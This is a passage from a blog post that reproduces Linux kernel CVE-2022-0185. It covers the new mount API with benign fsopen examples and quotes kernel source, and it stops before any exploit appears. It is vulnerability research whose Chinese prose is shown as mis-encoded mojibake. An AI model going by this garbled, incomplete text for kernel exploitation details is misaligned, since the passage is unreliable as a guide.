<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            CVE-2022-0185å¤ç° |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/ufo.ico">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-folder","tags":"/tags || fa-solid fa-tags"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"è¯„è®ºé‚®ä»¶é€šçŸ¥çš„åŠŸèƒ½å·²å¼€å¯ï¼Œæ¬¢è¿å¤§å®¶ç•™è¨€è¯„è®ºï¼Œæœ‰é—®é¢˜æˆ‘ä¼šåŠæ—¶å›å¤çš„å“¦ï½","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"æ…¢æ…¢å¥½èµ·æ¥"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®ºï¼ˆç•™ä¸‹é‚®ç®±æœ‰é€šçŸ¥å“¦ï½ï¼‰"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/ling.JPG">
                </a>
            
            <a class="site-name border-box" href="/">
               196082&#39;s blog
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
                                
                                é¦–é¡µ
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                
                                å½’æ¡£
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-folder"></i>
                                
                                åˆ†ç±»
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
                                
                                æ ‡ç­¾
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
                                </span>
                            
                            é¦–é¡µ
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                </span>
                            
                            å½’æ¡£
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-folder"></i>
                                </span>
                            
                            åˆ†ç±»
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
                                </span>
                            
                            æ ‡ç­¾
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        CVE-2022-0185å¤ç°
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/ling.JPG">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">196082</span>
                                
                                    <span class="author-badge">æ…¢æ…¢å¥½èµ·æ¥</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2023-10-15 17:03:20</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Wed Nov 29 2023 18:11:19 GMT+0800">2023-11-29 18:11:19</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/Linux-Kernel/">Linux Kernel</a></li>
                        
                    
                            <li class="category-item">&nbsp;<i class="icon fas fa-angle-right"></i>&nbsp;<a href="/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/">CVEå¤ç°</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/msg-msg/">msg_msg</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pipe-buffer/">pipe_buffer</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Filesystem/">Filesystem</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/fuse/">fuse</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/seq-operations/">seq_operations</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>11.6k å­—</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>59 åˆ†é’Ÿ</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®å¹¶ä¸æ˜¯å¾ˆæƒ³å¤ç°è¿™ä¸ªæ´ï¼Œä½†æ˜¯åœ¨å‰äº›å¤©fmyyå‘Šè¯‰äº†æˆ‘ä¸€ä¸ªåˆ©ç”¨æ–¹å¼<code>fuse</code>ï¼Œè™½ç„¶ä»–ä¹Ÿç»™æˆ‘æ¨èäº†å¯¹åº”çš„CVEï¼Œä¸è¿‡æˆ‘æ›´åŠ æ„¿æ„çœ‹å¢¨æ™šé¸¢ä½¬çš„åšå®¢ã€‚è¿™ä¸ªCVEå¤ç°ç»“æŸä¹‹ååº”è¯¥ä¼šæœ‰å¾ˆé•¿ä¸€æ®µæ—¶é—´ä¸ä¼šç»§ç»­å¤ç°CVEäº†ï¼Œåç»­çš„æ‰“ç®—æ˜¯æ›´å¤šçš„å­¦ä¹ <code>kernel fuzz</code>ã€‚</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a> è¿™é‡Œæ˜¯è¿™ä¸ªCVEå‘ç°è€…çš„æ–‡ç« ï¼Œé‡Œé¢æåˆ°äº†å…¶æ˜¯è¢«<code>syzkaller</code>ç»™fuzzå‡ºæ¥çš„ã€‚</p>
<h2 id="Filesystem-mount-API-åˆ†æ"><a href="#Filesystem-mount-API-åˆ†æ" class="headerlink" title="Filesystem mount API åˆ†æ"></a>Filesystem mount API åˆ†æ</h2><p>åœ¨Linuxä¸‹çš„æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ï¼Œ<code>mount</code> ç³»ç»Ÿè°ƒç”¨è¢«ç”¨ä»¥å°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ä»¥ <code>/</code> ä¸ºæ ¹èŠ‚ç‚¹çš„æ–‡ä»¶æ ‘ä¸Šï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æŒ‚è½½ç¡¬ç›˜ <code>/dev/sdb1</code> åˆ° <code>/mnt/temp</code> ç›®å½•ä¸‹ï¼Œä¹‹åå°±èƒ½åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œæ–‡ä»¶è®¿é—®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount /dev/sdb1 /mnt/temp</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mount(argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>], <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œæ–°çš„<code>mount API</code>å°†ä¸Šé¢çš„ä¸€ä¸ªç®€å•çš„<code>mount</code>ç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½æ‹†åˆ†æˆäº†å¤šä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¤šä¸ªç³»ç»Ÿè°ƒç”¨åˆ†åˆ«å¯¹åº”äº†ä¸åŒæ–‡ä»¶ç³»ç»ŸæŒ‚è½½é˜¶æ®µã€‚</p>
<h3 id="fsopen"><a href="#fsopen" class="headerlink" title="fsopen"></a>fsopen</h3><p>åœ¨Linuxä¸­ä¸€ç›´ç§‰æŒç€ä¸€åˆ‡çš†æ–‡ä»¶çš„æ€æƒ³ï¼Œåœ¨æ–°çš„<code>mount API</code>ä¸­ä¹Ÿæœ‰å¯¹åº”çš„æ˜ ç…§ï¼Œé¦–å…ˆåˆ™æ˜¯<code>fsopen</code>å°±ç±»ä¼¼äº<code>open</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿæè¿°ç¬¦(ç§°ä¸ºæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡)ã€‚</p>
<p>ç”±äºæ ‡å‡†åº“ä¸­è¿˜æœªæ·»åŠ å…¶ç›¸å…³ä»£ç ï¼Œå› æ­¤éœ€è¦æ‰‹å†™<code>raw syscall</code>æ¥è¿›è¡Œç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ‰“å¼€ä¸€ä¸ªç©ºç™½çš„ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ï¼ˆéœ€è¦ <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œæˆ–æ˜¯å¼€å¯äº† <code>unprivileged namespace</code> çš„æƒ…å†µä¸‹ä½¿ç”¨ <code>unshare()</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå¸¦æœ‰è¯¥æƒé™çš„ <code>namespace</code>ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ªç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ï¼Œå¹¶æ²¡æœ‰ä¸ä»»ä½•çš„å®é™…è®¾å¤‡è¿›è¡Œå…³è”ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(fsopen, <span class="keyword">const</span> <span class="keyword">char</span> __user *, _fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> *<span class="title">fs_type</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *fs_name;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	fs_name = strndup_user(_fs_name, PAGE_SIZE);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(fs_name))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(fs_name);</span><br><span class="line"></span><br><span class="line">	fs_type = get_fs_type(fs_name);</span><br><span class="line">	kfree(fs_name);</span><br><span class="line">	<span class="keyword">if</span> (!fs_type)</span><br><span class="line">		<span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line">	fc = fs_context_for_mount(fs_type, <span class="number">0</span>);</span><br><span class="line">	put_filesystem(fs_type);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(fc))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(fc);</span><br><span class="line"></span><br><span class="line">	fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;</span><br><span class="line"></span><br><span class="line">	ret = fscontext_alloc_log(fc);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">	put_fs_context(fc);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å†…æ ¸ä¸­è°ƒç”¨<code>fsopen</code>çš„ä¼šè¿›å…¥åˆ°å¦‚ä¸Šå‡½æ•°ï¼Œæœ€ç»ˆä¼šåœ¨<code>fscontext_create_fd</code>å‡½æ•°åˆ›å»ºä¸€ä¸ª<code>file</code>ç»“æ„ä½“ï¼Œå¹¶ä¸”è¿”å›æ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p><code>fscontext_alloc_log</code>é€šè¿‡åå­—å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œåˆ†é…çš„æ˜¯ç”¨äº<code>log</code>çš„å†…å­˜ã€‚</p>
<p><code>fs_context_for_mount</code>è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼çš„ç±»å‹ä¸º<code>fs_context</code>ï¼Œå…¶ä½œç”¨ä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ç»“æ„ä½“ã€‚</p>
<p><code>strndup_user</code>å‡½æ•°åˆ™æ˜¯è·å–ç”¨æˆ·æ€ä¼ å…¥çš„æ–‡ä»¶ç³»ç»Ÿåï¼Œ<code>get_fs_type</code>è¿™é‡Œæ˜¯è·å–å…¶<code>type</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Filesystem context for holding the parameters used in the creation or</span></span><br><span class="line"><span class="comment"> * reconfiguration of a superblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Superblock creation fills in -&gt;root whereas reconfiguration begins with this</span></span><br><span class="line"><span class="comment"> * already set.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/filesystems/mount_api.txt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">uapi_mutex</span>;</span>	<span class="comment">/* Userspace access mutex */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>	*<span class="title">fs_type</span>;</span></span><br><span class="line">	<span class="keyword">void</span>			*fs_private;	<span class="comment">/* The filesystem&#x27;s context */</span></span><br><span class="line">	<span class="keyword">void</span>			*sget_key;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>		*<span class="title">root</span>;</span>		<span class="comment">/* The root and superblock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>	*<span class="title">user_ns</span>;</span>	<span class="comment">/* The user namespace for this mount */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span>		*<span class="title">net_ns</span>;</span>	<span class="comment">/* The network namespace for this mount */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">cred</span>;</span>		<span class="comment">/* The mounter&#x27;s credentials */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fc_log</span>		*<span class="title">log</span>;</span>		<span class="comment">/* Logging buffer */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>		*source;	<span class="comment">/* The source name (eg. dev path) */</span></span><br><span class="line">	<span class="keyword">void</span>			*security;	<span class="comment">/* Linux S&amp;M options */</span></span><br><span class="line">	<span class="keyword">void</span>			*s_fs_info;	<span class="comment">/* Proposed s_fs_info */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sb_flags;	<span class="comment">/* Proposed superblock flags (SB_*) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sb_flags_mask;	<span class="comment">/* Superblock flags that were changed */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		s_iflags;	<span class="comment">/* OR&#x27;d with sb-&gt;s_iflags */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		lsm_flags;	<span class="comment">/* Information flags from the fs to the LSM */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_purpose</span>	<span class="title">purpose</span>:</span><span class="number">8</span>;</span><br><span class="line">	<span class="class"><span 